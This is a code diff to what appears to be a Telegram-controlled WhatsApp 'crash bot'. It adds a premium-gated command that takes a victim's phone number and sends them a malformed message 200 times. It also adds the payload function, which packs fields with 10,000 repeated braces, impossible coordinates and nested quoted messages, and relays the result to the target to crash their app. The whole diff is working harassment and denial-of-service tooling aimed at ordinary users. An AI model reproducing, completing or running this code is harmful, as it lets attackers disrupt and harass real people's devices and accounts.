@@ -2572,6 +2572,50 @@ bot.command("FaiqxRaraCrashInvis", checkWhatsAppConnection, checkPremium, checkC
     for (let i = 0; i < 100; i++) {
    await FriendBerulah(sock, target);
    await FaiqCrashInvis(sock, target);
+   await sleep(5000);
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Crash Andro
+☐ Status: Success</blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+
+bot.command("FaiqxRaraCrashInfinity", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraCrash 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = false;
+
+  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
+    caption: `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Crash Andro
+☐ Status: Process</blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+    for (let i = 0; i < 100; i++) {
+   await CrashInvisLocaVnX(sock, target);
+   await CrashInvisLocaVnX(sock, target);
    await sleep(2000);
   }
 
@@ -3439,6 +3483,76 @@ async function delaayylangu(sock, target) {
 } catch (err) {
   console.log(err.message)
   }
+}
+
+async function CrashInvisLocaVnX(sock, target) {
+  const msg = generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          extendedTextMessage: {
+            text: "Faiq",
+            matchedText: "https://t.me/FaiqOffc",
+            description: "Faiq",
+            title: "Faiq",
+            paymentLinkMetadata: {
+              button: { displayText: "Faiq" },
+              header: { headerType: 1 },
+              provider: { paramsJson: "{".repeat(10000) }
+            },
+            linkPreviewMetadata: {
+              paymentLinkMetadata: {
+                button: { displayText: "Faiq" },
+                header: { headerType: 1 },
+                provider: { paramsJson: "{".repeat(10000) }
+              },
+              paymentLinkMetadata: {
+                button: { displayText: "Faiq" },
+                header: { headerType: 1 },
+                provider: { paramsJson: "{".repeat(10000) }
+              },
+             contextInfo: {
+            remoteJid: target,
+            quotedMessage: {
+             ephemeralMessage: {
+              message: {
+              locationMessage: {
+             degreesLatitude: -12999,
+             degreesLongitude: 34999,
+             mame: "FaiqOffc⌜𖣂⌟༑⃟",
+             address: "FaiqOffc⌜𖣂⌟༑⃟꙳"
+            },
+              urlMetadata: {
+                fbExperimentId: 999,
+              },
+              fbExperimentId: 888,
+              linkMediaDuration: 555,
+              socialMediaPostType: 1221,
+              videoContentUrl:
+                "https://wa.me/settings/linked_devices/,,Faiq",
+              videoContentCaption: " x ",
+            },
+             },
+            },
+             },
+            },
+          },
+        },
+      },
+    },
+    { participant: { jid: target } },
+  );
+  await sock.relayMessage(target, { 
+      groupStatusMessageV2: { 
+        message: msg.message 
+      }
+    }, 
+  {
+    messageId: msg.key.id,
+    participant: { jid: target },
+    userJid: target,
+  });
 }
 
 //============( END ) =======\\
